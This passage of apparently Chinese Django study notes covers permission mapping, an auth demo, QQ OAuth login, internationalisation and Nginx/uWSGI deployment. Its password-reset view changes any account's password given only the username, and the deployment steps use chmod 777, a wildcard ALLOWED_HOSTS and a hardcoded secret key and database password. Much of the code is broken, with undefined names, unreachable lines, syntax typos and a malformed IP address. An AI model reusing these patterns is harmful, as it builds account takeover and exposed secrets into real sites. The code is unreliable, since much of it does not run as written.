        return None

    def has_perm(self, user_obj, perm, obj=None):
        app_label, codename = perm.split('.')
        content_types = ContentType.objects.filter(
            app_label = app_label,
            permission__codename = codename)  # 根据权限获取其对应的ContentType实例。
        for content_type in content_types:
            model_class = content_type.model_class()    # 根据 ContentType 实例获取对应的 Model 类
            if issubclass(model_class, PermMappableMixin):
                mapped_perm, mapped_obj = model_class.mapping_permission(perm, obj = obj)
                if mapped_perm and user_obj.has_perm(mapped_perm, obj=mapped_obj):
                    return True
        return False

# 新闻例子的代码：
from django.utils.translation import ugettext as _
from django.db import models

class InfoCategory(models.Model):
    name = models.CharField(max_length=128, verbose_name=_('分类名称'))

    class Meta:
        permissions = (
            ("add_info_by_category", _("允许添加分类信息")),
            ("change_info_by_category", _("允许修改分类信息")),
            ("delete_info_by_category", _("允许删除分类信息")),
        )


class Info(PermMappableMixin, models.Model):
    category = models.ForeignKey(InfoCategory, verbose_name=_("所属分类"))
    title = models.CharField(max_length=256, verbose_name=_('标题'))

    @classmethod
    def mapping_permission(cls, perm, obj=None):
        mapped_perm = None
        mapped_obj = None

        if perm == "permmapping.add_info":
            mapped_perm = "permmapping.add_info_by_category"
        elif perm == "permmapping.change_info":
            mapped_perm = "permmapping.change_info_by_category"
        elif perm == "permmapping.delete_info":
            mapped_perm = "permmapping.delete_info_by_category"

        if isinstance(obj, cls):
            mapped_obj = obj.category

        return mapped_perm, mapped_obj

</textarea>

<h4>auth demo</h4><pre>
使用django的auth组件,完成登录、注册、注销页面;
使用auth组件的权限,添加一个主页,主页展示商品列表,并设置一个权限才能访问;
使用admin组件,添加商品列表的数据;

需求分析
需要使用Django的auth组件,则不要单独建立user模型,使用自带的组件进行操作就可以了。

</pre><textarea>
### auth_study/urls.py：
# -*- coding:utf-8 -*-
from django.conf.urls import url,include
from auth_study import views

urlpatterns = [
    url(r'^register/$', views.Register.as_view(),name='register'),
    url(r'^login/$',views.Login.as_view(),name='login'),
    url(r'^index/$',views.Index.as_view(),name='index'),
    url(r'^logout/$',views.Logout.as_view(),name='logout'),
    url(r'^resetpassword/$',views.ResetPassword.as_view(),name='resetpassword'),
    url(r'^home/$', views.Home.as_view(), name='home'),
    url(r'^addProduct/$', views.AddProduct.as_view(), name='addProduct')
]

### auth_study/forms.py
# -*- coding: utf-8 -*-
from django import forms
from django.contrib.auth.models import User

class RegisterForm(forms.Form):
    userName = forms.CharField(label='用户名',min_length = 3,max_length = 20)
    userPassword = forms.CharField(label='登录密码',min_length= 6,max_length = 20,error_messages = {'min_length':'密码至少6位','max_length':'密码最长20位'})
    userConfirmPassword = forms.CharField(label='确认密码',min_length = 6,max_length = 20,error_messages = {'min_length':'密码至少6位','max_length':'密码最长20位'})
    userEmail = forms.EmailField(label=u'邮箱')

    def clean_userName(self):
        userName = self.cleaned_data['userName']
        user = User.objects.filter(username = userName)
        if user: raise forms.ValidationError('用户名已存在')
        return userName

    def clean_userConfirmPassword(self):
        userPassword = self.cleaned_data['userPassword']
        userConfirmPassword = self.cleaned_data['userConfirmPassword']
        if userPassword != userConfirmPassword: raise forms.ValidationError('两次密码不一致')
        return userPassword

class ResetPasswordForm(forms.Form):
    userName = forms.CharField(label='用户名',min_length = 3,max_length = 20)
    userPassword = forms.CharField(label='登录密码', min_length=6, max_length=20,error_messages={'min_length': '密码至少6位', 'max_length': '密码最长20位'})
    userConfirmPassword = forms.CharField(label='确认密码',min_length = 6,max_length = 20,error_messages = {'min_length':'密码至少6位','max_length':'密码最长20位'})

    def clean_userName(self):
        userName = self.cleaned_data['userName']
        user = User.objects.filter(username = userName)
        print(user)
        if not user:
            raise forms.ValidationError('用户名不存在')
        return userName

    def clean_userConfirmPassword(self):
        userPassword = self.cleaned_data['userPassword']
        userConfirmPassword = self.cleaned_data['userConfirmPassword']
        if userPassword != userConfirmPassword: raise forms.ValidationError('两次密码不一致')
        return userPassword

### auth_study/models.py
from django.db import models

class Product(models.Model):
    name = models.CharField('名称', max_length=50)
    price = models.FloatField('价格', max_length=200)
    detail = models.CharField('详细信息', max_length=200)

    def __str__(self):
        return self.name

### auth_study/views.py:
# -*- coding: utf-8 -*-
from __future__ import unicode_literals
from django.shortcuts import render,redirect,reverse
from django.contrib.auth.models import User,Permission
from django.views import View
from .forms import *
from django.http import HttpResponse
from django.contrib.auth import authenticate,login,logout
from django.contrib.auth.mixins import LoginRequiredMixin,PermissionRequiredMixin
from .models import Product

#注册功能
class Register(View):
    def get(self,request):
        return render(request,'sign_up.html')

    def post(self,request):
        form = RegisterForm(request.POST)
        print(form.is_bound)

        if form.is_valid():
            userName = form.cleaned_data['userName']
            userPassword = form.cleaned_data['userPassword']
            userConfirmPassword = form.cleaned_data['userConfirmPassword']
            userEmail = form.cleaned_data['userEmail']
            # create_user可以由Django自动将密码加密,而create还需要先将密码自己加密再给
            user = User.objects.create_user(username=userName,email=userEmail,password=userPassword)
            # 给用户添加权限,多对多关系,用add添加
            user.user_permissions.add(Permission.objects.get(codename='view_product'))
            # 需要save,因为他们都是一个数据库操作
            user.save()
            return HttpResponse('注册成功,请返回<a href="/auth/login">登录</a>')
            # 或者注册之后自动登录
            user = auth.authenticate(username=useranme, password=password) # 防止注册失败
            auth.login(request, user)
            return redirect(request.GET.get('next', reverse('home')))
        else:
            return render(request,'sign_up.html',locals())

# 登录功能
class Login(View):
    def get(self,request):
        return render(request,'sign_in.html')

    def post(self,request):
        userName = request.POST.get('userName')
        userPassword = request.POST.get('userPassword')
        print(userName,userPassword)
        # 验证用户,它接受两个参数,用户名username和密码password,认证只有是否激活跟用户名密码。
        user = authenticate(username = userName,password = userPassword)
        # 并在密码对给出的用户名合法的情况下返回一个User对象。如果密码不合法,authenticate()返回None。
        if user is not None:
            if user.is_active:
                # 登录,向session中添加SESSION_KEY, 便于对用户进行跟踪:
                login(request,user)
                # 如果调用login方法以后,request对象就会激活user属性,这个属性不管登录或者未登录都是存在
                return redirect(reverse('index'))
            else:
                message = '该用户未激活'
        else:
            message = '用户名或密码错误'

        return render(request,'sign_in.html',locals())

#登录验证,主要用于比如说直接输入地址情况
class Index(LoginRequiredMixin,View):
    # 没有登录则指定跳转,如果需要指定单独的跳转,则该类中指定login_url属性,如果需要指定全局的,则在settings中指定LOGIN_URL属性
    login_url = '/auth/login/'
    def get(self,request):
        print(request.COOKIES)
        return render(request, 'index.html', locals())

# 注销功能
class Logout(View):
    def get(self,request):
        # 注销用户,这个方法就会把session跟cookie清理掉
        logout(request)
        message = '注销成功'
        return render(request,'sign_in.html',locals())

# 重置密码
class ResetPassword(View):
    def get(self,request):
        return render(request,'resetpassword.html')

    def post(self,request):
        form = ResetPasswordForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['userName']
            userPassword = form.cleaned_data['userPassword']
            user = User.objects.get(username=username)
            if user:
                user.set_password(userPassword)
                user.save()
                return render(request, 'sign_in.html', locals())

        return render(request, 'resetpassword.html', locals())

# 展示主页
class Home(PermissionRequiredMixin,View):
    # 单个权限
    permission_required = 'auth_study.view_product'
    # 多个权限,要同时具有,且的关系,元祖或列表都可
    # permission_required = ['auth_study.view_product','auth_study.update_product']
    # 上面个相当于全局的,只有满足了上面权限中的一个就可以进入下面的get了,否则就跳转到setting配置的LOGIN_URL去了
    def get(self,request):
        print('get...',request.user.user_permissions.all())
        # has_perm(perm)： 判断用户是否有某个权限。
        # has_perms(perm_list)： 判断用户是否有权限列表中的某个列表。
        if request.user.has_perm('auth_study.view_product'):
            products = Product.objects.all()
            if request.user.has_perm('auth_study.add_product'):
                canAdd = True   # 判断有没有添加权限,然后置为True,页面去判断是否显示相关
        else:
            message = '没有查看商品的权限'
        return render(request,'home.html',locals())

# 添加商品
class AddProduct(View):
    def get(self,request):
        return render(request,'addProduct.html')

    def post(self,request):
        print('post')
        name = request.POST.get('username')
        price = request.POST.get('price')
        detail = request.POST.get('detail')
        print(name,price,detail)
        product = Product.objects.create(name = name,price = price,detail= detail)
        if product:
            return HttpResponse('添加商品成功< a href="/auth/home/">< /a>')

        return HttpResponse('添加商品失败< a href="/auth/home/">< /a>')

###注册页面sign_up.html
< form action="/auth/register/" method="post">
    {% csrf_token %}
    用 户 名：< input type="text" name="userName" placeholder="用户名"/>
    登录密码：< input type="password" name="userPassword" placeholder="登录密码"/>
    确认密码：< input type="password" name="userConfirmPassword" placeholder="确认密码"/>
    邮    箱：< input type="email" name="userEmail" placeholder="邮箱"/>
    < input type="submit" value="注册"/>
< /form>
{{ form.errors }} <!--如果注册错误则显示对应的错误 -->

###登录页面sign_in.html
{{ message }}
< form action="/auth/login/" method="post">
    {% csrf_token %}
    用 户 名：< input type="text" name="userName"/>
    登录密码：< input type="password" name="userPassword"/>
    < input type="submit" value="登录"/>
< /form>
< a href="/auth/resetpassword/">找回密码< /a>

###首页页面index.html
欢迎{{user.username}} {{user.email}} {{user.is_authenticated}}登录成功!
< br/>
< a href="/auth/home/">主页< /a>
< a href="/auth/logout/">退出< /a>

###主页home.html
< h2>{{user.username}}主页< /h2>
{% for product in products %}
< p>
    名称：{{ product.name }}< br/>
    详细信息：{{product.detail}}< br/>
    价格：{{product.price}}< br/>
< /p>
{% endfor %}
{{ message }}
{% if canAdd %} <!--判断有没有添加权限 -->
< a href="/auth/addProduct/">添加商品< /a>
{% endif %}

###添加商品addPruduct.html
< form action="/auth/addProduct/" method="post">
    {% csrf_token %}
    名称：< input type="text" name="username"/>
    价格：< input type="text" name="price"/>
    详细信息: < textarea name="detail">< /textarea>
    < input type="submit" value="添加">
< /form>

###找回密码resetpassword.html
< h1>找回密码< /h1>
< form action="/auth/resetpassword/" method="post">
    {% csrf_token %}
    用 户 名：< input type="text" name="userName"/>
    重置密码：< input type="password" name="userPassword"/>
    确认密码：< input type="password" name="userConfirmPassword"/>
    < input type="submit" value="确认"/>
< /form>
{{form.errors}}

</textarea>
</div>

<div id="django_oauth">
<h4>oauth 用QQ登录网站</h4><pre>
本质：创建QQ账户和网站用户账号的对应关系

开发流程
放置QQ登录按钮 -> 打开QQ登录页面 -> 扫码或输入QQ账号和密码登录 -> 认证通过,返回认证码,通过跳转到设置好的回调地址 -> 通过认证码获取通行证(可使用通行证调用QQ提供的接口) -> 通过通行证获取唯一ID(每个网站的唯一id都不同)

1、获取Authorization Code
请求地址：GET https://graph.qq.com/oauth2.0/authorize,即'使用QQ账号登录'按钮的链接地址
由于其中参数可能会变动,所以不宜硬编码,最好通过自定义的模板标签自动生成

</pre><textarea>
# 将QQ登录配置写入settings
QQ_APP_ID = '在QQ互联申请时的APPID'
QQ_APP_KEY = os.environ['QQ_APP_KEY'] # 在QQ互联申请时的APPKEY,存入环境变量确保安全
QQ_REDIRECT_URL = '在QQ互联申请时的回调地址如https://example.com/user/login_by_qq'
QQ_STATE = '随便填'

# 创建user/templatetags/,添加__init__.py使之成为包,再添加user_tags.py
from django.conf import settings
from urllib.parse import urlencode
from django import tamplate
register = template.Library()

@register.simple_tag
def get_login_qq_url():
    params = {
        'response_type': 'code',
        'client_id': settings.QQ_APP_ID,
        'redirect_url': settings.QQ_REDIRECT_URL,
        'state': settings.QQ_STATE
    }
    return 'https://graph.qq.com/oauth2.0/authorize?' + urlencode(params)

### usr/templates/user/login.html
# 加载自定义模板标签
{% load user_tags %}
# 使用自定义模板标签,直接调用get_login_qq_url生成连接
< a href="{% get_login_qq_url %}">使用QQ账户登录< /a>

在本地开发环境点击登录按钮时会跳转到生产环境的域名上,此时需要修改本地host文件
c:\Windows|system32\Drivers\etc\hosts
1270.0.0.1 example.com

python3 manage.py runserver 127.0.0.1:80

### 判断openid是否有关联的用户,可以考虑把openid字段放入和User模型一对一的UserProfile模型,但考虑到以后可能会扩展其他登录方式,所以将openid放入新建的模型OauthRelationship,user/models.py
class OauthRelationship(models.Model):
    OAUTH_TYPE_CHOICES = (
        (0, 'QQ'),
        (1, 'wechat'),
        (2, 'github'),
    )

    user = models.ForeignKey(User, on_delete=CASCADE)
    openid = models.CharField(max_length=128)
    oauth_type = models.IntegerField(default = 0, choices = OAUTH_TYPE_CHOICES)

    def __str__(self):
        return '< OauthRelationship: %s >' % self.user.username

# user/admin.py
@admin.register(OauthRelationship)
class OauthRelationshipAdmin(admin.ModelAdmin):
    list_display = ('user', 'oauth_type', 'openid')

# user/forms.py
class BindQQFrom(forms.Form):
    # 同登录表单,需要填入用户名和密码
    # 一个用户只允许绑定一个QQ,在clean()方法中
    if OAuthRelationship.objects.filter(user=user, oauth_type=0).exists():
        raise forms.validationError('该用户已绑定QQ账号')
    pass

# user/views.py
from django.conf import settings
from urllib.request from urlopen
from urllib.parse import urlencode,parse_qs
import json
from .models import OauthRelationship

def login_by_qq():
    code = request.GET.get('code')
    state = request.GET.get('state')
    if state != settings.QQ_STATE: raise Exception('state error')
    # 获取Access_token
    params = {
        'grant_type': 'authorization_code',
        'client_id': setting.AA_APP_ID,
        'client_secret': setting.QQ_APP_KEY,
        'code': code,
        'redirect_url': settings.QQ_REDIRECT_URL,
    }
    response = urlopen('https://graph.qq.com/oauth2.0/token?' + urlencode(params))
    data = response.read().decode()
    access_token = parse_qs(data)['access_token'][0]

    # 获取用户openid
    response = urlopen('https://graph.qq.com/oauth2.0/me?access_token='+access_token)
    data = response.read().decode()
    openid = json.loads(data[10:-4])['openid']

    '''设置断点,在命令行runserver调试,dir()查看当前的变量
    import pdb
    pdb.set_trace()
    '''

    # 通过openid和网站用户对应并令其登录
    if OauthRelationship.objects.filter(openid=openid, oauth_type=0).exists():
        relationship = OauthRelationship.objects.get(openid=openid, oauth_type=0)
        auth.login(request, relationship.user)
        return redirect(reverse('home'))
    else:
        request.session['openid'] = openid
        # 使用QQ互联提供的接口访问用户信息如头像昵称
        params = {
            'access_token': access_token,
            'oauth_consumer_key': settings.QQ_APP_ID,
            'openid': openid,
        }
        response = urlopen('https://graph.qq.com/user/get_user_info?' + urlencode(params)).read().decode()
        data = json.loads(response)

        params = {
            'nickname': data['nickname'],
            'avatar': data['avatar'],
        }
        return redirect(reverse('bind_qq') + '?' + urlencode(params))

def bind_qq(self):
    # 逻辑同登录视图,get请求显示绑定qq页面,post请求验证表单
    if request.method == 'post':
        bind_qq_form = BindQQForm(request.POST)
        if bind_qq_form.is_valid():
            user = bind_qq_form.cleaned_data[user]
            openid = request.session.pop['openid']
            relationship = OauthRelationship()
            relationship.user = user
            relationship.openid = openid
            relationship.oatuh_type = 0
            relationship.save()
            auth.login(request, user)
            return redirect(reverse('home'))
    else:
        bind_qq_form = BindQQForm()

    context = {}
    context['bind_qq_form'] = bind_qq_form
    context['nickname'] = request.GET['nickname']
    context['avatar'] = request.GET['avatar']
    return render(request, 'user/bind_qq.html', context)  # 类似登录页面

# 用户通过QQ第一次登录网站且没有账户信息
def create_user_by_qq(request):
    # 创建随机用户
    username = str(int(time.time()))
    password = ''.join(random.sample(string.acii_letters + string.digits, 16))
    user = User.objects.create_user(username, '', password)

    profile = UserProfile.objects.create(user=user, nickname=request.GET['nickname'])

    # 记录关系
    openid = request.session.pop('openid')
    relationship = OauthRelationship.objects.create(user=user, openid=openid, oauth_type=0)

    # 登录
    auth.login(request, user)
    return redirect(reverse('home'))

</textarea>
</div>

<div id="django_translation">
<h4>国际化和本地化</h4><pre>
国际化是指使用不同语言的用户在访问同一个网站页面时能够看到符合其自身语言的文本页面。

国际化的基本原理是:
浏览器通过LANGUAGE_CODE在HTTP请求头中告诉网站后台服务器用户所需要的页面语言;
网站服务器在渲染页面时,根据LANGUAGE_CODE查询每个需要翻译成对应语言的文本字符串,并将其替换到网页内,最后将网页返回给用户浏览器。

Django对文本翻译、日期格式、时间格式、数字格式和时区具有很好的支持,这些内容是国际化的主要工作对象。

本质上Django做了这么两件事:
允许开发者和模板设计者指定在他们的app中哪些部分需要进行翻译或者格式化成当地的语言、习惯、用法和习俗;
根据用户的偏好习惯,使用钩子进行Web本地化。

一、在视图中标识需要翻译的文本
在视图中和HTML模板中都可以标识要翻译的文本。在视图中通过_()或ugettext()函数指定某个变量需要翻译

</pre><textarea>
from django.utils.translation import ugettext as _
from django.http import HttpResponse

def my_view(request):
    output = _("Welcome to my site.")
    return HttpResponse(output)

# 等同于:
from django.utils.translation import ugettext
from django.http import HttpResponse

def my_view(request):
    output = ugettext("Welcome to my site.")
    return HttpResponse(output)

# 也等同于:
def my_view(request):
    sentence = 'Welcome to my site.'
    output = _(sentence)
    return HttpResponse(output)

# 还可以这么用:
def my_view(request, m, d):
    output = _('Today is %(month)s %(day)s.') % {'month': m, 'day': d}
    return HttpResponse(output)

# 如果想给翻译人员一些提示,可以添加一个以Translators为前缀的注释
def my_view(request):
    # Translators: This message appears on the home page only
    output = ugettext("Welcome to my site.")

</textarea><pre>
二、在模板中表示需要翻译的文本
在模版文件中要标识一个待翻译的文本需要使用{% trans %}模板标签,trans标签内部不可以有内嵌的模板变量,但首先要在模版的顶部加载{% load i18n %}

</pre><textarea>
{% load i18n %}
< title>{% trans "This is the title." %}< /title>
< title>{% trans myvar %}< /title>

# 如果想提前翻译字符串但是不显示出来,可以使用下面的方法:
{% trans "This is the title" as the_title %}
< title>{{ the_title }}< /title>
< meta name="description" content="{{ the_title }}">

# 上面的做法实际上相当于定义了几个模板变量,下面则是更加复杂的用法:
% trans "starting point" as start %}
{% trans "end point" as end %}
{% trans "La Grande Boucle" as race %}

< a href="/" title="{% blocktrans %}Back to '{{ race }}' homepage{% endblocktrans %}">{{ race }}< /a>
< p>
{% for stage in tour_stages %}
    {% cycle start end %}: {{ stage }}{% if forloop.counter|divisibleby:2 %}< br />{% else %}, {% endif %}
{% endfor %}
< /p>

</textarea><pre>
三、blocktrans模板标签
与{% trans %}模板标签不同,blocktrans标签允许通过使用占位符来标记由文字和可变内容组成的复杂句子进行翻译

</pre><textarea>
{% blocktrans %}This string will have {{ value }} inside.{% endblocktrans %}

# 还可以像下面一样使用:
{% blocktrans with amount=article.price %}
That will cost $ {{ amount }}.
{% endblocktrans %}

{% blocktrans with myvar=value|filter %}
This will have {{ myvar }} inside.
{% endblocktrans %}

# 甚至在一个blocktrans标签内内使用多个表达式:
{% blocktrans with book_t=book|title author_t=author|title %}
This is {{ book_t }} by {{ author_t }}
{% endblocktrans %}

</textarea><pre>
四、本地化
一旦标记好需要翻译的文本也就是国际化后就需要进行本地化,也就是创建翻译用的语言文件。
语言文件(Language File)是Django用于保存翻译关系的文件,网站应该为每种支持的语言建立一个语言文件。

建立语言文件是通过django-admin makemessages命令完成的。
在项目的根目录下也就是包含manage.py的目录下运行下面的命令:
django-admin makemessages -l de
其中的de表示要本地化的国家,例如pt_BR表示巴西葡萄牙语,奥地利德语为de_AT,印尼语为id。

或者使用下面的方式:
python manage.py makemessages -l zh-cn  //中文简体
python manage.py makemessages -l en     //英文

执行命令后Django会在根目录及其子目录下搜集所有需要翻译的字符串,默认情况下它会搜索.html、.txt和.py文件,然后在根目录的locale/LANG/LC_MESSAGES目录下创建一个django.po文件。对于上面的例子目录就是locale/de/LC_MESSAGES/,文件就是locale/de/LC_MESSAGES/django.po。

在Windows下需要提前安装GNU gettext工具,否则会弹出下面的错误:CommandError: Can't find msguniq. Make sure you have GNU gettext tools 0.15 or newer installed.

每个.po文件首先包含一小部分元数据,例如翻译维护者的联系信息,但文件的大部分是翻译对照:被翻译字符串和特定语言的实际翻译文本之间的简单映射。

例如,有一个像下面这样的待翻译字符串:
_("Welcome to my site.")
在.po文件中将包含一条下面样子的条目:
#: path/to/python/module.py:23  # 第一行通过注释表达该条要翻译的字符串在视图或模版中的位置
msgid "Welcome to my site."     # 要翻译的字符串,不要修改它
msgstr ""                       # 翻译后的文本。一开始它是空的,需要翻译人员逐条填写

这是一个文本文件,需要专业的翻译人员将所有的msgstr空白'填写'齐全。如果项目比较大,这可能是个磨人的事。

五、编译语言文件
当完成语言文件的创建和翻译工作后或对语言文件修改后,需要将其编译成对应的*.mo文件,Django在运行时将使用*.mo文件对网站进行国际化翻译。

进入项目根目录,运行下面的命令进行语言文件编译:
django-admin compilemessages
Django将自动搜索所有的.po文件,将它们都翻译成.mo文件。

至此,国际化和本地化就完成了。网站页面将根据访问者使用语言的不同,展示为不同的语言版本,比如中文、英文、法文、德文之类。

</pre>
</div>

<div id="django_production">
<h4>部署 Django</h4><pre>
基于下面的架构:
Python3 + ubuntu 16.04 + Nginx + uWSGI + Django 1.11
首先得有一台ubuntu机器,真实物理机和虚拟机都行,如果是阿里云ECS主机并且带有独立公网IP是最好不过。

查看系统的python版本
$ python Tab*2
python               python2.7            python3-jsondiff     python3-jsonschema   python3.6m           pythonw.exe
python.exe           python27.dll         python3-jsonpatch    python3.3.zip        python33.dll
python2              python3              python3-jsonpointer  python3.6            python3m
$ which python3
/usr/bin/python3

安装python3.6
apt-get install software-properties-common  # 要从PPA安装一个软件时通常会先执行该命令
add-apt-repository ppa:jonathonf/python-3.6
apt-get update
apt-get install python3.6

创建软链接
cd /usr/bin
rm python
ln -s python3.6 python
rm python3
ln -s python3.6 python3

安装pip3.6
$ pip Tab*2
$ pip3
$which pip3
/usr/bin/pip3

$ apt-get install python3-pip
$ pip3 install --upgrade pip

安装mysql
wget https://dev.mysql.com/get/mysql-apt-config_0.8.10-1_all.deb # 从mysql官网查找对应的库
dpkg -i mysql-apt-config_0.8.10-1_all.deb
apt-get update
apt-get install mysql-server

同步mysql数据
本地mysql：mysqldump -u admin -p django_db > data.sql
从本地上传sql文件到服务器：scp data.sql user@host:/home/data.sql
$ mysql -u admin -p django_db
mysql> source /home/data.sql

clone代码
1、直接ftp上传到服务器
2、使用git命令将本地代码上传到github,然后通过ssh命令从github上git clone到服务器
3、scp命令：scp source_file user@host:directory/target_file

启动测试开发服务器
python3 manage.py runserver 0.0.0.0:80

add '119.23.201.6' to ALLOWED_HOSTS
setting.ALLOWED_HOSTS = [*]
setting.DEBUG = False

【 安装Nginx 】
sudo add-apt-repository ppa:nginx/stable # Ubuntu默认源里面的Nginx版本比较旧,需要先添加一个Nginx的源
apt-get update
apt-get install nginx

使用service --status-all命令查看nignx带+表示nignx服务已自动启动:

然后通过ifconfig,查看一下ubuntu虚拟机的ip地址如192.168.1.121。使用同一局域网内的主机,通过浏览器访问192.168.1.121,如果能看到nginx的界面则说明nginx服务正常

【 安装uWSGI 】
Django的主要部署平台就是WSGI,它也是Python的标准web服务器和应用。uwsgi的作用是提供服务器与python程序的交互,静态文件的请求需要web服务器如nginx的支持,即如果只开启uwsgi服务则web页面的js、css等静态文件无法起作用
web服务器软件nginx通过WSGI规范(web server gateway interface)与Django程序交互

uWSGI是实现了WSGI的工具,需要下载和安装它,需要同时安装python的开发包python3.6-dev
uWSGI的官网地址:https://uwsgi-docs.readthedocs.io/en/latest/index.html
不建议使用:pip3 install uwsgi(不一定是最新版)
不建议使用:pip3 install https://projects.unbit.it/downloads/uwsgi-lts.tar.gz(也不一定是最新版)
而是建议到https://uwsgi-docs.readthedocs.io/en/latest/Download.html页面,下载Stable/LTS版本的源文件

在ubuntu中解压源码,然后指定安装位置将uwsgi安装好:
tar -zxvf uwsgi # 解压文件
sudo python3 setup.py install # 进入解压目录
$ uwsgi # 安装完毕后,尝试运行一下uwsgi

测试uWSGI
uwsgi --http :8000 --wsgi-file test.py
需要先设置阿里云服务器安全组的端口

【 配置uwsgi 】
软件安装好了后,首先是要拷贝项目代码。
可以通过命令行uwsgi参数配置,更方便的方式是使用配置文件
在项目的根目录下也就是有manage.py的目录下新建一个uwsgi.ini文件,在里面写入下面的配置内容:

</pre><textarea>
[uwsgi]
#配置项中以'#'开头的都是被注释的项目,不起作用;以双斜杠开头表示注释;
chdir = /home/feixue/python/www/for_test    // 项目根目录,这里的项目名叫for_test
home = /home/mysite_env                     // 指定虚拟环境,没虚拟环境则可省略
module = for_test.wsgi:application          // 指定wsgi模块,moudule是入口wsgi模块,将for_test替换成项目名称
socket = 127.0.0.1:8000                     // 通信端口设置,对本机8000端口提供服务
master = true                               // 以主进程模式运行
processes = 4                               // 启动4个进程来处理请求
harakiri=60                                 // 请求超时时间
max-requests = 5000                         // 每个进程处理的最大请求数,超过则自动重启该进程
vacuum = true                               // 退出、重启时清理文件
uid=1000
gid=2000
pidfile = /var/run/uwsgi9090.pid            // pid文件,用于下脚本启动、停止该进程
daemonize = /home/feixue/python/www/for_test/run.log    // 日志文件,会自动建立
disable-logging = true                      // 不记录正常信息,只记录错误信息,否则日志可能很快就爆满了

#vhost = true                               // 多站模式
#no-site = true                             // 多站模式时不设置入口模块和文件
#workers = 2                                // 子进程数
#reload-mercy = 10
#limit-as = 512
#buffer-size = 30000

测试配置文件
uwsgi --ini /home/feixue/python/www/for_test/uwsgi.ini

</textarea><pre>
【 配置Nginx 】
备份/etc/nginx/sites-available文件夹内的default文件然后编辑:

</pre><textarea>
server {
    listen 80;
    listen [::]:80;

    server_name 192.168.1.121;  # 将server_name改成实际名称

    location / {
        uwsgi_pass  127.0.0.1:8000;
        include  /etc/nginx/uwsgi_params;
    }
    location /static {          # location /static的alias改成实际情况
        alias /home/feixue/python/www/for_test/static;
    }
    location /mdeia {          # location /static的alias改成实际情况
        alias /home/feixue/python/www/for_test/mdeia;
    }
}

</textarea><pre>
修改完毕,保存退出,然后重启nginx服务:
sudo service nginx restart

【 启动服务 】
尝试启动服务,进入项目的根目录也就是有uwsgi.ini文件的地方,运行:
sudo uwsgi uwsgi.ini
系统提示:
[uWSGI] getting INI configuration from uwsgi.ini

到主机浏览器中访问'192.168.1.121',却看见下面的错误提示页面
DisallowedHost at /
Invalid HTTP_HOST header: '192.168.1.121'. You may need to add '192.168.1.121' to ALLOWED_HOSTS
提示需要在ALLOWED_HOSTS配置项目中添加'192.168.1.121'。

进入相应目录,编辑settings.py文件:
DEBUG = False
ALLOWED_HOSTS = ['192.168.1.121']

在ubuntu中运行下面的命令:
sudo killall -9 uwsgi
这会删除先前的uwsgi进程,过几秒,端口释放有延迟,然后:
sudo uwsgi uwsgi.ini

再次在浏览器中访问192.168.1.121看到欢迎信息

启动uwsgi：uwsgi --ini /home/mysite_uwsgi/mysite.ini
重启uwsgi：uwsgi --reload /home/mysite_uwsgi/master.pid

【 django部署配置清单 】
1、关闭debug
多个settings.py文件,设置allow_hosts
settings/development.py和settings/production.py
提取development和production中公共的部分放入settings/base.py中,from .base import *
base.py中BASE_DIR=os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
python3 manage.py runserver --settings:mysite.settings.development
开发环境：manage.py中os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'mysite.settings.development')
生产环境：wsgi.py中os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'mysite.settings.production')

使用环境变量设置敏感信息(生产环境的SECRET_KEY、数据库密码、邮箱授权码)
SECRET_KEY = os.environ['SECRET_KEY']
DATABASEs_PASSWORD = os.environ['DATABASEs_PASSWORD']
EMIAL_HOST_PASSWORD = os.environ['EMIAL_HOST_PASSWORD']
开发环境和生产环境试验不同的SECRET_KEY、数据库密码：
$python3 manage.py shell
>>> from django.core.management import utils
>>> dir(utiles)
>>> utils.get_random_secret_key()

ubuntu设置环境变量
$ sudo vim /etc/profile
export SECRET_KEY=5^+1s(3u)="ni$h-#_4qqj3ery6jj(wm1%bx%h!xbh&#d9n3sz#"
export DATABASEs_PASSWORD="admin123456"
export EMIAL_HOST_PASSWORD="*****"
$ sudo source /etc/profile
$ echo $EMIAL_HOST_PASSWORD # 测试环境变量是否生效

生产环境配置日志文件,发送错误时发送邮件给管理员

</pre><textarea>
ADMIN = (('admin_user_name', 'admin_user_name@eamil.com'),)

LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'handlers': {
        'file': {
            'level': 'DEBUG',
            'class': 'logging.FileHandler',
            'filename': '/home/mysite_debug.log', # $ chmode 666 mysite_debug.log授予其他人写权限
        },
        'mail_admins': {
            'level': 'ERROR',
            'class': 'django.utils.log.AdminEmailHandler',
        }
    },
    'loggers': {
        'django': {
            'handlers': ['file'],
            'level': 'DEBUG',
            'propagate': True,
        },
        'django.request': {
            'handlers': ['mail_admins'],
            'level': 'ERROR',
            'propagate': False,
        },
    },
}

</textarea><pre>
404、500错误页面
templates目录添加404.html、500.html

2、静态文件
收集静态文件
关闭debug之后静态文件不再通过django获取了,需要通过服务器软件nginx
base.py
STATIC_URL = '/static/'
STATIC_ROOT = os.path.join(BASE_DIR, 'static_collected')
STATICFILES_DIRS = [os.path.join(BASE_DIR, 'static')]
生产环境ubuntu: $ python3 manage.py collectstatic
然后修改nginx配置
location /static {
    alias /home/mysite/static_collected;
}

favicon.ico文件放入项目根目录
修改nginx配置
location /favicon.ico {
    alias /home/mysite/favicon.ico;
}

3、设置上传文件目录的权限
chmod 777 media/

ip地址不需要备案,域名需要备案
域名example.com解析
添加记录-> A -> (主机记录) -> (记录值)1**.**.**.1 # 可通过example.com访问
添加记录-> cname -> (主机记录)www -> (记录值)example.com # 可通过www.example.com访问

https = http(hyper text transter protocol) + ssl(secure socket layer) 防劫持、防篡改、防监听
使用https协议需要SSL证书(由CA证书颁发机构签发)
SSL证书主要是对用户和服务器认证,包含一对密钥用于加密和解密
CA机构：Let`s Encrypt和Symantec
一般云服务器有提供申请免费SSL证书服务
签发证书之后点下载,选择nginx,网页上有提供安装指南教程,下载之后有两个文件：.crt和.key
将两个文件剪切到项目根目录同级的cert_nginx目录中,将cert_nginx传输到服务器
$ scp -r cert_nginx server_username@sever.com:/etc/nginx/cert
该命令会自动创建cert目录

配置nginx
listen 443;
server_name example.com;
ssl on;
ssl_certificate /etc/nginx/cert/filename.crt; # 公钥
ssl_certificate_key /etc/nginx/cert/filename.key; # 私钥
ssl_session_timeout 5m; # 超时时间

将代码中使用的http连接修改为https或去掉http:
http://cdn.example.com/test.js
https://cdn.example.com/test.js
